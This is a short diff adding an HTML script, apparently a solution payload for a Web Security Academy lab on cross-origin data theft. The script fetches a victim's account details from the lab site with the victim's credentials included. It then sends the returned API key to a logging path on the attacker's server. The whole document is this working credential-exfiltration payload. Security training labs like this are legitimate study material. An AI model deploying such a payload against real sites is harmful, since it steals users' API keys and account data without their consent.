@@ -1,0 +1,9 @@
+<script>
+    fetch('https://....web-security-academy.net/accountDetails', {
+        credentials: 'include'
+    })
+    .then(resp => resp.json())
+    .then(json => {
+        fetch(`/log/${json.apikey}`);
+    });
+</script>
